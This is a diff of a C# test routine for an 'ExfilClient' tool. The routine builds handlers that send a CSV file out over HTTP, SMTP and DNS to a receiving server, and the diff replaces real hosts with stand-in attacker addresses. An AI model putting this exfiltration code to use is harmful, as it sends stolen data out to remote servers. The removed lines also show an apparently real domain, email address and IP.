@@ -30,7 +30,7 @@ namespace ExfilClient
         }
         static void RunTests()
         {
-            string testfile = "C:\\Users\\jimmy\\SutterWork\\dev-branch\\code\\JuneProject\\DOTNET_ExfilClient\\testdata\\fakerecs.csv";
+            string testfile = "somefakerecs.csv";  // input csv, data must already be formatted to csv... well not reeally, but for testing is easy
             for (int i = 0; i < 1; i++)
             {
                 SupportedFileTypes ftype = SupportedFileTypes.CSV;
@@ -41,11 +41,11 @@ namespace ExfilClient
                 SupportedSenderMethods method4 = SupportedSenderMethods.SMTP;
                 SupportedSenderMethods method5 = SupportedSenderMethods.DNS;
 
-                ExfiltrationHandler h1 = new ExfiltrationHandler(method1, ftype, testfile, "http://kaizencyber.io:5000/receive.php");
-                ExfiltrationHandler h2 = new ExfiltrationHandler(method2, ftype, testfile, "http://kaizencyber.io:5000/receive.php");
-/*TEST THIS ONE*///ExfiltrationHandler h = new ExfiltrationHandler(method3, ftype, testfile, "http://kaizencyber.io:5000/receive.php");
-                ExfiltrationHandler h3 = new ExfiltrationHandler(method4, ftype, testfile, "jreeves@kaizencyber.io",Options.SMTP_STARTTLS_HANDSHAKE);
-                ExfiltrationHandler h4 = new ExfiltrationHandler(method5, ftype, testfile, "167.172.215.59");
+                ExfiltrationHandler h1 = new ExfiltrationHandler(method1, ftype, testfile, "http://myattackserver.io:5000/receive.php");
+                ExfiltrationHandler h2 = new ExfiltrationHandler(method2, ftype, testfile, "http://myattackserver.io:5000/receive.php");
+/*TEST THIS ONE*///ExfiltrationHandler h = new ExfiltrationHandler(method3, ftype, testfile, "http://myattackserver.io:5000/receive.php");
+                ExfiltrationHandler h3 = new ExfiltrationHandler(method4, ftype, testfile, "myemail@myattackserver.io",Options.SMTP_STARTTLS_HANDSHAKE);
+                ExfiltrationHandler h4 = new ExfiltrationHandler(method5, ftype, testfile, "my.attack.server.ip");
                /* h1.SendExfilData(Options.NONE);
                 h1.SendExfilData(Options.DATA_ENCODE_TO_B64);
                 h2.SendExfilData(Options.NONE);
